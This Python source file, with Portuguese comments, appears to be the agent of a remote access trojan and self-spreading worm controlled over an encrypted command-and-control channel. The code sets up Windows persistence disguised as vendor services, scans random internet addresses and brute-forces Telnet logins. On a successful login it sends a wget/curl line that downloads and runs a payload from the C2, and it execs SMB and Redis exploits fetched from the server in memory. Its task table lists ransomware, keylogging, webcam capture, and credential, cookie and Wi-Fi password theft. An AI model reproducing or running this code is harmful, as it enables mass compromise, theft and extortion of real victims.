def capture_process_info(args=None):
    try: return [p.info for p in psutil.process_iter(['pid', 'name', 'username'])], "processes_result"
    except Exception as e: return str(e), "error"

def establish_persistence(args):
    """
    Módulo de persistência aprimorado que permite ao operador escolher o método.
    Exemplos de 'args':
    - {"method": "run_key", "name": "TeamsUpdate"}
    - {"method": "schtask", "name": "GoogleCrashReport"}
    - {"method": "service", "name": "NvidiaDriverHelper", "display_name": "NVIDIA Driver Helper"}
    """
    system = platform.system()
    if system != "Windows":
        # A lógica para Linux (crontab) pode ser mantida ou expandida depois.
        # Por enquanto, focamos no Windows.
        return "Módulo de persistência aprimorado atualmente focado no Windows.", "error"

    try:
        # Validação dos argumentos recebidos
        if not isinstance(args, dict) or 'method' not in args:
            return "Erro: O método de persistência não foi especificado. (Ex: 'run_key', 'schtask')", "error"

        method = args.get("method")
        # Usa o nome fornecido ou um nome padrão aleatório se não for especificado
        name = args.get("name", "SystemUpdate" + "".join(random.choices(string.ascii_lowercase, k=6)))
        
        executable_path = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
        
        # Constrói o caminho absoluto para os executáveis do sistema para evitar problemas com o PATH
        reg_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "reg.exe")
        schtasks_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "schtasks.exe")
        sc_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "sc.exe")

        # --- Lógica de Despacho para cada Método ---

        if method == "run_key":
            key_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
            command = [reg_path, 'add', key_path, '/v', name, '/t', 'REG_SZ', '/d', executable_path, '/f']
            subprocess.run(command, capture_output=True, shell=True)
            return f"Persistência estabelecida via Chave de Registro (Run Key) com o nome: '{name}'.", "persistence_result"

        elif method == "schtask":
            # Cria uma tarefa agendada para ser executada no logon do usuário
            command = [
                schtasks_path, '/create', '/sc', 'ONLOGON', 
                '/tn', name, 
                '/tr', f'"{executable_path}"', 
                '/rl', 'HIGHEST', # Tenta rodar com os maiores privilégios disponíveis
                '/f' # Força a criação se a tarefa já existir
            ]
            result = subprocess.run(command, capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                return f"Persistência estabelecida via Tarefa Agendada com o nome: '{name}'.", "persistence_result"
            else:
                return f"Falha ao criar Tarefa Agendada: {result.stderr}", "error"

        elif method == "service":
            # Tenta criar um serviço. Requer privilégios de Administrador.
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                return "Erro: A criação de serviço requer privilégios de Administrador.", "error"
            
            display_name = args.get("display_name", name) # Nome que aparece na UI de serviços
            
            # Comando para criar o serviço
            create_command = [
                sc_path, 'create', name, 
                'binPath=', f'"{executable_path}"', 
                'start=', 'auto', 
                'DisplayName=', f'"{display_name}"'
            ]
            result = subprocess.run(create_command, capture_output=True, text=True, shell=True)
            if result.returncode != 0:
                return f"Falha ao criar o serviço: {result.stderr}", "error"
            
            # (Opcional) Adiciona uma descrição para parecer mais legítimo
            description_command = [sc_path, 'description', name, "Fornece suporte para componentes essenciais do sistema."]
            subprocess.run(description_command, capture_output=True, shell=True)
            
            return f"Persistência estabelecida via Serviço do Windows com o nome: '{name}'.", "persistence_result"

        else:
            return f"Erro: Método de persistência '{method}' desconhecido.", "error"

    except Exception as e:
        return f"Falha ao estabelecer persistência: {e}", "error"


def get_task():
    if not AGENT_ID: return None
    try:
        # --- INÍCIO DA MUDANÇA ---
        # 1. Gera os headers autenticados. Como GET não tem corpo, o payload é vazio.
        auth_headers = get_authenticated_headers() 
        
        # 2. Envia a requisição usando os novos headers
        response = session.get(
            SERVER_URL + "/get_task/" + AGENT_ID, 
            headers=auth_headers
        )
        # --- FIM DA MUDANÇA ---
        
        if response.status_code == 200:
            decrypted_json_str = decrypt_data(response.content, C2_AES_KEY)
            if not decrypted_json_str:
                write_internal_log("[WARN] Falha ao DECRIPTOGRAFAR tarefa do C2.")
                return None
            return json.loads(decrypted_json_str)
        else:
            write_internal_log(f"[WARN] get_task recebeu um status code inesperado: {response.status_code}")
            return None
            
    except requests.exceptions.RequestException as e:
        write_internal_log(f"[WARN] Erro de rede em get_task: {e}")
        return None
    
    except Exception as e:
        write_internal_log(f"[CRASH] Exceção fatal em get_task: {e}")
        import traceback
        write_internal_log(traceback.format_exc())
        return None

    

def report_worm_activity(message, level="WORM_LOG"):
    """
    Envia um log de atividade específico do worm para o C2 para exibição no painel em tempo real.
    Esta função é separada do write_internal_log para não poluir o log principal.
    """
    try:
        # Usa um ID de tarefa falso, pois não é um resultado de tarefa real
        fake_task_id = f"worm-log-{uuid.uuid4()}"
        
        payload = {
            "agent_id": AGENT_ID, "task_id": fake_task_id,
            "data_type": level, # Será "WORM_LOG" ou "WORM_VULN"
            "result": str(message)
        }
        
        payload_json = json.dumps(payload)
        encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
        if not encrypted_payload: return

        payload_bytes = encrypted_payload.encode('utf-8')
        auth_headers = get_authenticated_headers(payload_bytes)
        
        base_url = SERVER_URL.split('/api')[0]
        post_url = urljoin(base_url, "/task_result")
        
        # Envia e não se preocupa com a resposta
        requests.post(post_url, data=payload_bytes, headers=auth_headers, timeout=5)
    except Exception:
        # Se falhar, não faz nada. A operação do worm continua.
        pass

def propagation_worker(target_ip, credentials_list, c2_url, stop_event):
    """
    Tenta se conectar a um IP via Telnet e usar uma lista de credenciais para login.
    Se bem-sucedido, tenta baixar e executar o payload do C2.
    """
    try:
        import telnetlib
    except ImportError:
        return # Módulo não disponível

    for user, pwd in credentials_list:
        if stop_event.is_set():
            return

        try:
            # Tenta conectar na porta Telnet (23) com um timeout curto
            tn = telnetlib.Telnet(target_ip, 23, timeout=5)
            
            # Procura por prompts de login/senha
            tn.read_until(b"login: ", timeout=3)
            tn.write(user.encode('ascii') + b"\n")
            
            if pwd:
                tn.read_until(b"Password: ", timeout=3)
                tn.write(pwd.encode('ascii') + b"\n")

            
            _, match, _ = tn.expect([b"#", b"$", b">"], timeout=5)

            if match:
                write_internal_log(f"[PROPAGATION-SUCCESS] Login bem-sucedido em {target_ip} com {user}:{pwd}")
                
                
                payload_url = f"{c2_url}/download/agent.sh" 
                
                cmd = f"wget -O /tmp/payload.sh {payload_url} || curl -o /tmp/payload.sh {payload_url}; chmod +x /tmp/payload.sh; /tmp/payload.sh\n"
                tn.write(cmd.encode('ascii'))
                
                tn.close()
                return
                
            tn.close()
        except Exception:
            continue  # Prosseguir com o tratamento de falhas e erros e posteriormente implementar melhorias para propagação automatica em cada host infectado

def start_worm_mode(args):
    """
    MÓDULO DE CAÇA (WORM) v3.2 - Com expansão de CIDR.
    """
    try:
        duration_minutes = int(args.get("duration_minutes", 60))
        target_list_str = args.get("targets", None)
        ports_str_arg = args.get("ports", None) # Pega a string de portas

        sync_mode = args.get("sync_mode", False)
        
        mode_name = "Síncrono (Análise)" if sync_mode else "Assíncrono (Rápido)"
        report_worm_activity(f"Modo de Caça ativado em modo: {mode_name}", level="WORM_LOG")

        def hunter_thread_logic():
            stop_time = time.time() + duration_minutes * 60
            
            if target_list_str:
                # --- MODO DIRECIONADO ---
                write_internal_log(f"INFO: [MODO CAÇA - DIRECIONADO] Iniciado. Alvos brutos: {target_list_str}")
                report_worm_activity(f"Modo Caça (Direcionado) ativado. Alvos: {target_list_str}", level="WORM_LOG")
                
                # --- INÍCIO DA CORREÇÃO ---
                initial_targets = [t.strip() for t in target_list_str.replace(',', ' ').split() if t.strip()]
                expanded_targets = []
                
                for item in initial_targets:
                    try:
                        # Tenta interpretar o item como uma rede (ex: 192.168.1.0/24)
                        network = ipaddress.ip_network(item, strict=False)
                        # Adiciona todos os IPs válidos da rede à lista final
                        for ip in network.hosts():
                            expanded_targets.append(str(ip))
                        report_worm_activity(f"Bloco/IP '{item}' expandido para {len(list(network.hosts()))} hosts.", level="WORM_LOG")
                    except ValueError:
                        # Se não for uma rede, trata como um único IP
                        expanded_targets.append(item)

                report_worm_activity(f"Total de {len(expanded_targets)} alvos individuais para escanear.", level="WORM_LOG")
                
                # Itera sobre a lista de IPs JÁ EXPANDIDA
                for target_ip in expanded_targets:
                    if time.time() > stop_time: 
                        break
                    
                    # Passa apenas um IP de cada vez para a função de scan
                    scan_args = {"targets": [target_ip], "ports": ports_str_arg, "sync_mode": sync_mode}
                    scan_and_exploit(scan_args)
                    time.sleep(0.5)
                # --- FIM DA CORREÇÃO ---
            
            else:
                # --- MODO GLOBAL (WORM) ---
                # (Esta parte permanece a mesma)
                write_internal_log(f"INFO: [MODO CAÇA - GLOBAL] Iniciado. Caçando na internet por {duration_minutes} minutos.")
                report_worm_activity(f"Modo Caça (Global/Worm) ativado por {duration_minutes} minutos.", level="WORM_LOG")

                while time.time() < stop_time:
                    first_octet = random.choice([i for i in range(1, 224) if i not in [10, 127, 172, 192]])
                    target_ip = f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                    
                    scan_args = {"targets": [target_ip], "ports": ports_str_arg, "sync_mode": sync_mode}
                    scan_and_exploit(scan_args)
                    time.sleep(1)
            
            write_internal_log("INFO: [MODO CAÇA] Duração concluída. Finalizando.")
            report_worm_activity("Módulo de Caça concluído.", level="WORM_LOG")

        main_hunter_thread = threading.Thread(target=hunter_thread_logic)
        main_hunter_thread.daemon = True
        main_hunter_thread.start()

        msg = f"SUCESSO: Módulo de Caça ativado por {duration_minutes} minutos."
        return msg, "info"

    except Exception as e:
        error_msg = f"ERRO: Falha ao iniciar o Módulo de Caça: {e}"
        write_internal_log(error_msg)
        return error_msg, "error"



def parse_ports(ports_arg, default_ports):
    """
    Interpreta a string de portas fornecida pelo operador.
    Retorna uma lista de inteiros representando as portas a serem escaneadas.
    """
    # Se nenhum argumento de porta foi passado (None ou string vazia), usa a lista padrão.
    if not ports_arg:
        write_internal_log(f"[parse_ports] Nenhuma porta especificada. Usando lista padrão com {len(default_ports)} portas.")
        return default_ports

    ports_arg = ports_arg.lower().strip()
    write_internal_log(f"[parse_ports] Processando argumento de portas: '{ports_arg}'")

    # Caso especial para 'all'
    if ports_arg == "all":
        write_internal_log("[parse_ports] Palavra-chave 'all' detectada. Escaneando todas as 65535 portas.")
        return list(range(1, 65536))

    # Usamos um 'set' para evitar portas duplicadas e depois o convertemos para uma lista ordenada.
    final_ports = set()
    
    # Divide a string por vírgulas para lidar com múltiplas entradas (ex: "80, 443, 1000-2000")
    parts = ports_arg.split(',')

    for part in parts:
        part = part.strip()
        if '-' in part:
            # É uma faixa (ex: "1-1024")
            try:
                start, end = map(int, part.split('-'))
                # Validação para garantir que a faixa é lógica e dentro dos limites de portas.
                if 0 < start <= end < 65536:
                    final_ports.update(range(start, end + 1))
            except ValueError:
                # Ignora faixas mal formatadas como "80-abc"
                write_internal_log(f"[parse_ports] AVISO: Faixa de porta mal formatada ignorada: '{part}'")
                continue
        else:
            # É uma porta única
            try:
                port = int(part)
                # Validação para garantir que a porta está dentro dos limites.
                if 0 < port < 65536:
                    final_ports.add(port)
            except ValueError:
                # Ignora portas inválidas como "abc"
                write_internal_log(f"[parse_ports] AVISO: Entrada de porta inválida ignorada: '{part}'")
                continue
    
    # Converte o set para uma lista e a ordena para um scan sequencial.
    sorted_ports = sorted(list(final_ports))
    write_internal_log(f"[parse_ports] Lista final de portas processada: {len(sorted_ports)} portas.")
    return sorted_ports



def scan_and_exploit(args):
    """
    Versão 4.3 - "Nmap Style"
    - Corrige o erro 'list index out of range'.
    - Loga o banner completo do serviço para análise detalhada.
    """
    try:
        write_internal_log(f"[scan_and_exploit] Argumentos recebidos: {args}")

        target_ips = args.get("targets", [])
        ports_str_arg = args.get("ports", None)
        sync_mode = args.get("sync_mode", False)
        
        default_ports_list = [21, 22, 23, 25, 26, 53, 55, 59, 80, 443, 445, 6379, 8080, 7443, 8443, 9090, 9999, 3389, 3356]
        ports_to_scan = parse_ports(ports_str_arg, default_ports_list)

        write_internal_log(f"[scan_and_exploit] Portas a serem escaneadas: {ports_to_scan}")

        if not target_ips:
            return "Erro: Nenhuma lista de alvos fornecida.", "error"

        # Busca o mapa de vulnerabilidades do C2 (sua lógica está correta)
        base_url = SERVER_URL.split('/api')[0] if '/api' in SERVER_URL else SERVER_URL
        map_url = urljoin(base_url, "/api/get_vuln_map")
        headers = get_authenticated_headers()
        response = requests.get(map_url, headers=headers, timeout=10)
        response.raise_for_status()
        vuln_map = response.json()
        
        windows_smb_exploits = ["ms08_067_netapi.py", "ms17_010_eternalblue.py"]
        generic_probe = b"\r\n\r\n"

        write_internal_log(f"[scan_and_exploit] Iniciando loop para os alvos: {target_ips}")
        
        for ip in target_ips:
            write_internal_log(f"--- [WORM] Analisando Alvo: {ip} ---")
            report_worm_activity(f"Analisando alvo: {ip}", level="WORM_LOG")
            
            for port in ports_to_scan:
                report_worm_activity(f"--> {ip}:{port}: Verificando...", level="WORM_LOG")
                
                try:
                    def launch_exploit(exploit_args):
                        """Função auxiliar para decidir como lançar o exploit."""
                        if sync_mode:
                            report_worm_activity(f"--> {ip}:{port}: Executando exploit '{exploit_args['exploit_script']}' em modo SÍNCRONO...", level="WORM_VULN")
                            run_exploit(exploit_args)
                        else:
                            report_worm_activity(f"--> {ip}:{port}: Disparando exploit '{exploit_args['exploit_script']}' em modo ASSÍNCRONO...", level="WORM_VULN")
                            threading.Thread(target=run_exploit, args=(exploit_args,), daemon=True).start()

                    # Lógica de scan e detecção de banner (sem alterações)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2.0); s.connect((ip, port))
                    banner = ""; 
                    try:
                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                        if not banner: s.send(generic_probe); banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    except socket.timeout: pass
                    finally: s.close()
                    
                    # --- INÍCIO DA MODIFICAÇÃO ---
                    
                    # Limpa o banner de caracteres não imprimíveis para um log limpo
                    clean_banner = ''.join(c for c in banner if c.isprintable()).strip()

                    # VERIFICA SE O BANNER NÃO ESTÁ VAZIO ANTES DE USÁ-LO
                    if clean_banner:
                        # Loga o banner completo tanto no painel quanto no arquivo interno
                        log_message = f"--> {ip}:{port}: [ABERTA] Banner: {clean_banner}"
                        report_worm_activity(log_message, "WORM_LOG")
                        write_internal_log(f"[WORM-SCAN] {log_message}")
                    else:
                        # Se não houver banner, apenas informa que a porta está aberta
                        log_message = f"--> {ip}:{port}: [ABERTA] Conexão bem-sucedida, mas serviço silencioso."
                        report_worm_activity(log_message, "WORM_LOG")
                        write_internal_log(f"[WORM-SCAN] {log_message}")

                    # --- LÓGICA DE AÇÃO (Usa o clean_banner) ---
                    
                    if port == 6379:
                        launch_exploit({"target_ip": ip, "exploit_script": "redis_unauth_cron.py"})

                    elif port == 445:
                        for exploit_script in windows_smb_exploits:
                            launch_exploit({"target_ip": ip, "exploit_script": exploit_script})
                            if not sync_mode: time.sleep(1)
                    
                    elif port == 80:
                        # A sua lógica original para a porta 80 já chama um exploit específico,
                        # então vamos mantê-la.
                        launch_exploit({"target_ip": ip, "exploit_script": "dvr_shell_injection.py"})

                    # A checagem do mapa de vulnerabilidades agora usa o 'clean_banner'
                    if clean_banner:
                        for banner_key, exploit_script in vuln_map.items():
                            if banner_key.lower() in clean_banner.lower():
                                # Evita chamar o exploit de DVR duas vezes se a porta for 80
                                if exploit_script == "dvr_shell_injection.py" and port == 80: continue
                                
                                launch_exploit({"target_ip": ip, "exploit_script": exploit_script})
                                break # Para após encontrar a primeira correspondência
                    
                    # --- FIM DA MODIFICAÇÃO ---

                except (socket.timeout, ConnectionRefusedError, OSError):
                    pass # Porta fechada, continua silenciosamente para a próxima
                except Exception as e:
                    error_msg = f"--> {ip}:{port}: ERRO inesperado durante o scan: {e}"
                    write_internal_log(f"[WORM-ERROR] {error_msg}")
                    report_worm_activity(error_msg, level="WORM_LOG")
        
        return "Sub-rotina de varredura concluída.", "info"

    except Exception as e:
        import traceback
        error_msg = f"Erro crítico no orquestrador de exploração: {e}\n{traceback.format_exc()}"
        write_internal_log(error_msg)
        return error_msg, "error"



# Em agente.py

# Em agente.py

def run_exploit(args):
    """
    Orquestrador de Exploração (v2.3 - Logs Híbridos)
    - Cria uma função de log que escreve tanto no arquivo interno quanto no painel em tempo real.
    """
    exploit_script_name = args.get("exploit_script", "N/A")
    try:
        target_ip = args.get("target_ip")
        if not target_ip or exploit_script_name == "N/A":
            return "Argumentos 'target_ip' e 'exploit_script' são necessários.", "error"

        # --- INÍCIO DA MUDANÇA ---

        def hybrid_log(message):
            """
            Função de log "híbrida".
            1. Escreve a mensagem no log interno do agente.
            2. Envia a mesma mensagem para o painel do worm em tempo real.
            """
            # Garante que a mensagem seja uma string
            log_message = str(message)
            
            # 1. Log interno (como antes)
            write_internal_log(log_message)
            
            # 2. Log para o painel em tempo real
            # Adiciona o prefixo do alvo para contexto no painel
            report_worm_activity(f"--> {target_ip}: {log_message}", "WORM_LOG")

        # --- FIM DA MUDANÇA ---

        hybrid_log(f"--- INÍCIO DO PROCESSO DE EXPLORAÇÃO: {exploit_script_name} ---")
        hybrid_log(f"[ALVO] IP do alvo definido como: {target_ip}")

        from urllib.parse import urljoin
        base_url = SERVER_URL.split('/api')[0] if '/api' in SERVER_URL else SERVER_URL

        # --- ETAPA 1: BAIXAR O STAGER ---
        stager_name = "drone.sh"
        stager_url = urljoin(base_url, f"/download/{stager_name}")
        hybrid_log(f"[PASSO 1/4] Baixando stager '{stager_name}' de: {stager_url}")
        
        stager_headers = get_authenticated_headers() 
        response_stager = requests.get(stager_url, headers=stager_headers, timeout=30)
        response_stager.raise_for_status()
        stager_script_content = response_stager.text
        hybrid_log(f"[SUCESSO] Stager baixado com sucesso ({len(stager_script_content)} bytes).")

        # --- ETAPA 2: BAIXAR O SCRIPT DE EXPLOIT ---
        exploit_url = urljoin(base_url, f"/exploits/{exploit_script_name}")
        hybrid_log(f"[PASSO 2/4] Baixando script de exploit de: {exploit_url}")

        exploit_headers = get_authenticated_headers()
        response_exploit = requests.get(exploit_url, headers=exploit_headers, timeout=30)
        response_exploit.raise_for_status()
        exploit_code = response_exploit.text
        hybrid_log(f"[SUCESSO] Script de exploit baixado com sucesso ({len(exploit_code)} bytes).")
        
        # --- ETAPA 3: EXECUTAR O EXPLOIT EM MEMÓRIA ---
        hybrid_log(f"[PASSO 3/4] Preparando para executar o exploit em memória...")
        exploit_globals = {}
        exec(exploit_code, exploit_globals)
        
        if 'run' in exploit_globals and callable(exploit_globals['run']):
            hybrid_log(f"[INFO] Função 'run' encontrada no exploit. Invocando agora...")
            
            # --- INÍCIO DA MUDANÇA ---
            # Passamos a nova função de log híbrida para o exploit.
            exploit_globals['run'](
                target_ip=target_ip, 
                stager_script=stager_script_content,
                log_function=hybrid_log 
            )
            # --- FIM DA MUDANÇA ---
        else:
            raise RuntimeError(f"O script de exploit '{exploit_script_name}' não define uma função 'run' executável.")

        # --- ETAPA 4: FINALIZAÇÃO ---
        hybrid_log(f"[PASSO 4/4] Execução do módulo de exploit concluída.")
        hybrid_log(f"--- FIM DO PROCESSO DE EXPLORAÇÃO: {exploit_script_name} ---")
        return f"Processo de exploração contra {target_ip} concluído.", "info"

    except Exception as e:
        import traceback
        error_msg = f"Erro crítico durante a exploração com '{exploit_script_name}': {e}"
        # Loga o erro em ambos os lugares
        hybrid_log(error_msg)
        hybrid_log(f"Traceback: {traceback.format_exc()}")
        hybrid_log(f"--- PROCESSO DE EXPLORAÇÃO FALHOU: {exploit_script_name} ---")
        return error_msg, "error"




def spawn_process(command):
    """
    Inicia um processo em segundo plano ('fire and forget') sem capturar sua saída.
    Útil para iniciar aplicações GUI ou processos de longa duração.
    """
    try:
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return f"Processo para o comando '{command}' iniciado em segundo plano com sucesso.", "info"
    except Exception as e:
        return f"Falha ao iniciar o processo em segundo plano: {e}", "error"



def send_result(task_id, result_data, data_type):
    if not AGENT_ID: return
    
    payload = {"agent_id": AGENT_ID, "task_id": task_id, "data_type": data_type, "result": result_data}
    
    try:
        # 1. Prepara o payload
        payload_json = json.dumps(payload)
        encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
        if not encrypted_payload:
            write_internal_log("Falha ao CRIPTOGRAFAR resultado da tarefa.")
            return

        # 2. Converte para bytes (o que realmente será enviado)
        payload_bytes = encrypted_payload.encode('utf-8')

        # 3. GERA A ASSINATURA USANDO OS BYTES CORRETOS
        # Este é o passo crucial. A assinatura é criada para o corpo exato da requisição.
        auth_headers = get_authenticated_headers(payload_bytes)

        # 4. Envia a requisição com os dados e a assinatura correspondente
        response = session.post(SERVER_URL + "/task_result", data=payload_bytes, headers=auth_headers)
        
        # 5. Processa a resposta (sem alterações)
        if response.status_code == 200:
            response_str = decrypt_data(response.content, C2_AES_KEY)
            if not response_str or "success" not in response_str: 
                 write_internal_log("Resultado enviado, mas a resposta do C2 falhou na decriptografia.")
        else:
            # Adiciona um log para vermos se o erro 400 persiste
            write_internal_log(f"[ERRO] /task_result retornou status {response.status_code}. Corpo: {response.text}")
            
    except Exception as e:
        write_internal_log(f"Erro ao enviar resultado: {e}")



# --- Dispatch Table para Tarefas v2.8 ---

# Tarefas que rodam em Threads (longa duração)
THREADED_TASKS = {
    "encrypt": encrypt_files_on_target,
    "decrypt_target": decrypt_files_on_target,
    "network_scan": scan_internal_network,
    "start_attack": start_attack,
    "run_exploit": run_exploit,
    "start_worm_mode": start_worm_mode
}

# Tarefas Síncronas (execução rápida, retornam dados)
SYNC_TASKS = {
    "webcam_snap": capture_webcam_image,
    "ransom_note": show_ransom_note,
    "keylogger_start": start_keylogger,
    "keylogger_stop": stop_keylogger,
    "download": download_from_target,
    "screenshot": capture_screenshot,
    "sysinfo": capture_system_info,
    "cookies": capture_cookies,
    "processes": capture_process_info,
    "credentials": capture_credentials,
    "shell": execute_shell_command,
    "persist": establish_persistence,
    "start_listener": start_pivot_listener,
    "kill": kill_process,
    "elevate": elevate_privileges,
    "remote_exec": remote_wmi_exec,
    "spawn": spawn_process,
    "upload": upload_to_target,
    "network_recon": capture_network_info,
    "wifi_passwords": capture_wifi_passwords,
    "lateral_psexec": lateral_psexec
}

# Tarefas que rodam e não retornam nada (o agente sai ou elas não têm "resultado")
NO_RETURN_TASKS = {
     "cleanup": cleanup_and_self_destruct,
     # 'sleep' é tratado separadamente no loop
}

def run_threaded_task(target_function: callable, args: any, result_container: list):
    """
    Executa a função alvo e armazena o resultado em um container (lista).
    """
    try:
        result_data, data_type = target_function(args)
        if result_data is not None:
            result_container.append((result_data, data_type))
    except Exception as e:
        error_message = f"Erro na execução da thread: {e}"
        result_container.append((error_message, "error"))

# Em agent.py

def main_loop():
    write_internal_log("Entrando no loop principal (v3.1 - Híbrido)")
    
    active_threads = {}  # Dicionário para rastrear threads: {task_id: (thread, container)}

    while True:
        # --- PARTE 1: VERIFICAR THREADS CONCLUÍDAS ---
        # Esta parte é do seu novo loop e é excelente, vamos mantê-la.
        completed_tasks = []
        for task_id, (thread, result_container) in active_threads.items():
            if not thread.is_alive():
                if result_container: # Se a lista não estiver vazia
                    result_data, data_type = result_container[0]
                    send_result(task_id, result_data, data_type)
                else:
                    # A thread terminou mas não produziu resultado (pode ter tido um erro interno)
                    send_result(task_id, "Tarefa concluída sem resultado explícito.", "info")
                completed_tasks.append(task_id)
        
        for task_id in completed_tasks:
            del active_threads[task_id]

        # --- PARTE 2: OBTER E DESPACHAR NOVA TAREFA ---
        task = get_task()
        if not task:
            time.sleep(random.randint(MIN_SLEEP, MAX_SLEEP))
            continue

        write_internal_log(f"TAREFA BRUTA RECEBIDA DO C2: {task}")

        command = task.get("command")
        task_id = task.get("task_id")
        args = task.get("args")
        
        result_data = None
        data_type = "generic_result"

        try:
            # Lógica de despacho explícita, inspirada no seu loop antigo
            if command in THREADED_TASKS:
                if task_id in active_threads:
                    result_data, data_type = "Erro: Tarefa com este ID já está em execução.", "error"
                else:
                    target_func = THREADED_TASKS[command]
                    result_container = []
                    thread = threading.Thread(target=run_threaded_task, args=(target_func, args, result_container))
                    thread.daemon = True
                    thread.start()
                    active_threads[task_id] = (thread, result_container)
                    result_data, data_type = f"Tarefa '{command}' iniciada em background.", "info"

            elif command in SYNC_TASKS:
                target_func = SYNC_TASKS[command]
                result_data, data_type = target_func(args)

            elif command in NO_RETURN_TASKS:
                target_func = NO_RETURN_TASKS[command]
                target_func(args) # Chama a função (ex: cleanup)
                # Se a função não sair, o loop continua. Se sair (sys.exit), o programa termina aqui.
                continue # Pula o send_result, pois não há o que enviar

            # Tratamento especial para 'sleep' pode ser útil
            elif command == "sleep":
                sleep_duration = int(args) if args else random.randint(MIN_SLEEP, MAX_SLEEP)
                time.sleep(sleep_duration)
                result_data, data_type = f"Sleep de {sleep_duration}s concluído.", "info"

            else:
                result_data, data_type = f"Comando desconhecido ou não mapeado: '{command}'", "error"

        except Exception as e:
            import traceback
            error_message = f"Erro ao processar comando '{command}': {e}\n{traceback.format_exc()}"
            write_internal_log(f"[CRASH] {error_message}")
            result_data, data_type = error_message, "error"

        # Envia o resultado apenas se houver algo para enviar
        if task_id:
            send_result(task_id, result_data, data_type)





if __name__ == "__main__":
    initialize_globals()

    try:
        if getattr(sys, 'frozen', False):
            os.chdir(os.path.dirname(sys.executable))
        else:
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
        write_internal_log(f"Diretório de trabalho definido para: {os.getcwd()}")
    except Exception as e:
        write_internal_log(f"Falha ao definir o diretório de trabalho: {e}")

    write_internal_log(f"--- INÍCIO DA EXECUÇÃO DO AGENTE (Versão: {AGENT_VERSION}) ---")
    
    self_install_and_persist()
    
    if anti_analysis_checks():
        write_internal_log("Ambiente suspeito detectado. Encerrando.")
        sys.exit(0)
    
    write_internal_log("Iniciando loop de registro perpétuo.")
    
    # --- INÍCIO DA MELHORIA DE RESILIÊNCIA ---
    # Este loop agora é infinito e mais robusto. Ele só será interrompido
    # se o main_loop() for chamado e, por algum motivo, encerrar.
    while True:
        if register_with_c2():
            write_internal_log("Registro bem-sucedido. Entrando no loop principal de tarefas.")
            main_loop()
            # Se, por qualquer motivo extraordinário, o main_loop() terminar,
            # o 'break' abaixo garante que o script do agente encerre em vez de
            # tentar se registrar novamente.
            write_internal_log("[CRITICAL] O loop principal de tarefas foi encerrado. O agente vai parar.")
            break
        else:
            # Se o registro falhar (por timeout, erro de rede, etc.),
            # ele loga, espera um tempo aleatório e tenta novamente, para sempre.
            sleep_time = random.randint(30, 60)
            write_internal_log(f"Falha no registro. Tentando novamente em {sleep_time} segundos.")
            tor_session = initialize_tor_session()
            time.sleep(sleep_time)
    